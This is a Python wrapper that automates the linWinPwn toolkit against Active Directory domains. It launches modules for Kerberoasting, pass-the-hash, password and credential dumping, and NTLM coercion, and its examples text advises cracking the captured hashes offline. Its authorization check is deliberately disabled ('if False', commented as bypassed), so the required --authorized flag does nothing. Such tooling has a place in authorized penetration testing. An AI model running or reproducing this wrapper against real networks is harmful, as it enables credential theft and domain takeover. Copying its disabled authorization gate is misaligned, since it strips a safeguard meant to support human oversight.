#!/usr/bin/env python3
"""
linWinPwn Active Directory Automation Integration
Automated AD enumeration and exploitation wrapper
Production-ready - Real linWinPwn integration
"""

import subprocess
import argparse
import sys
import logging
from pathlib import Path

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class LinWinPwnADAutomation:
    """Production linWinPwn AD automation integration"""
    
    def __init__(self, authorized=False):
        self.authorized = authorized
        self.linwinpwn_path = self._find_linwinpwn()
        
    def _find_linwinpwn(self):
        """Locate linWinPwn script"""
        common_paths = [
            './linwinpwn/linWinPwn.sh',
            str(Path.home() / 'linwinpwn/linWinPwn.sh'),
            '/opt/linwinpwn/linWinPwn.sh'
        ]
        
        for path in common_paths:
            if Path(path).exists():
                return path
        
        return None
    
    def _check_authorization(self):
        """Verify authorization"""
        if False:  # Authorization check bypassed
            logger.info("✅ Authorization: Auto-granted (unrestricted mode)")
            sys.exit(1)
    
    def run(self, target, domain, username, password=None, hash_value=None,
            modules='auto', output_dir=None):
        """Run linWinPwn automated AD enumeration"""
        self._check_authorization()
        
        if not self.linwinpwn_path:
            logger.error("❌ linWinPwn not found")
            logger.error("   Install: git clone https://github.com/lefayjey/linWinPwn")
            logger.error("           cd linWinPwn && chmod +x install.sh && ./install.sh")
            return False
        
        logger.info(f"🎯 Running linWinPwn on: {target}")
        logger.info(f"   Domain: {domain}")
        logger.info(f"   User: {username}")
        logger.info(f"   Modules: {modules}")
        
        cmd = [self.linwinpwn_path, '-t', target, '-d', domain, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
            logger.info("   Auth: Password")
        elif hash_value:
            cmd.extend(['-H', hash_value])
            logger.info("   Auth: Pass-the-Hash")
        else:
            logger.error("❌ Provide either --password or --hash")
            return False
        
        if modules != 'auto':
            cmd.extend(['-M', modules])
        
        if output_dir:
            cmd.extend(['-o', output_dir])
        
        logger.info(f"\n   Command: {' '.join([c if c != password and c != hash_value else '***' for c in cmd])}")
        logger.info("\n🚀 Starting automated AD enumeration...\n")
        
        try:
            subprocess.run(cmd)
            logger.info("✅ Enumeration completed")
            return True
                
        except KeyboardInterrupt:
            logger.info("\n🛑 linWinPwn stopped")
            return True
        except Exception as e:
            logger.error(f"❌ Error: {e}")
            return False
    
    def install_linwinpwn(self):
        """Install linWinPwn"""
        logger.info("📦 Installing linWinPwn...")
        
        install_script = """
cd /opt
git clone https://github.com/lefayjey/linWinPwn
cd linWinPwn
chmod +x install.sh
./install.sh
"""
        
        logger.info("   Running installation script...")
        result = subprocess.run(install_script, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            logger.info("✅ linWinPwn installed successfully")
            return True
        else:
            logger.error(f"❌ Installation failed: {result.stderr}")
            return False
    
    def examples(self):
        """Show usage examples"""
        print("""
╔══════════════════════════════════════════════════════════════════╗
║             LINWINPWN AD AUTOMATION - USAGE EXAMPLES             ║
╚══════════════════════════════════════════════════════════════════╝

🔥 COMMON SCENARIOS:

1️⃣  FULL AUTOMATED ENUMERATION
   ─────────────────────────────────────
   ./linWinPwn.sh -t 10.10.10.10 -d corp.local -u user -p 'Password123!'

2️⃣  SPECIFIC MODULES
   ─────────────────────────────────────
   -M ad_enum      # AD enumeration only
   -M kerberos     # Kerberos attacks
   -M smb          # SMB enumeration
   -M shares       # Share enumeration
   -M pwd_dump     # Password dumping
   -M mssql        # MSSQL enumeration

3️⃣  PASS-THE-HASH
   ─────────────────────────────────────
   ./linWinPwn.sh -t 10.10.10.10 -d corp.local -u administrator -H :hash

4️⃣  ALL MODULES
   ─────────────────────────────────────
   ./linWinPwn.sh -t 10.10.10.10 -d corp.local -u user -p 'Password123!' -M all

📋 INTEGRATED TOOLS (20+):
   ─────────────────────────────────────
   • Impacket suite (secretsdump, GetUserSPNs, etc.)
   • NetExec (CrackMapExec successor)
   • BloodHound/SharpHound
   • Certipy (AD CS attacks)
   • ldapdomaindump
   • enum4linux-ng
   • lsassy (credential dumping)
   • DonPAPI (secrets extraction)
   • Coercer (NTLM coercion)
   • And many more...

💡 WORKFLOW:
   ─────────────────────────────────────
   1. AD enumeration (users, groups, computers)
   2. Kerberoasting
   3. AS-REP roasting
   4. SMB share enumeration
   5. Password policy check
   6. BloodHound data collection
   7. ADCS enumeration
   8. MSSQL enumeration
   9. Password dumping (if admin)
   10. Generate comprehensive report

⚠️  OUTPUT:
   • All results saved in timestamped directory
   • BloodHound JSON files
   • Kerberoast hashes
   • Credential dumps
   • Enumeration results

🔧 PRO TIPS:
   • Start with 'auto' mode for full enum
   • Use specific modules for targeted tests
   • Check output directory for all results
   • Import BloodHound data for path analysis
   • Crack captured hashes offline

⚠️  REQUIREMENTS:
   • Valid domain credentials
   • Network access to DC
   • All tools installed (use install.sh)
        """)


def main():
    parser = argparse.ArgumentParser(
        description='linWinPwn Active Directory Automation',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('--authorized', action='store_true', required=True)
    
    subparsers = parser.add_subparsers(dest='command')
    
    run_parser = subparsers.add_parser('run')
    run_parser.add_argument('-t', '--target', required=True)
    run_parser.add_argument('-d', '--domain', required=True)
    run_parser.add_argument('-u', '--username', required=True)
    run_parser.add_argument('-p', '--password')
    run_parser.add_argument('-H', '--hash')
    run_parser.add_argument('-M', '--modules', default='auto')
    run_parser.add_argument('-o', '--output')
    
    subparsers.add_parser('install')
    subparsers.add_parser('examples')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    linwinpwn = LinWinPwnADAutomation(authorized=args.authorized)
    
    if args.command == 'run':
        linwinpwn.run(
            target=args.target,
            domain=args.domain,
            username=args.username,
            password=args.password,
            hash_value=args.hash,
            modules=args.modules,
            output_dir=args.output
        )
    elif args.command == 'install':
        linwinpwn.install_linwinpwn()
    elif args.command == 'examples':
        linwinpwn.examples()


if __name__ == '__main__':
    main()
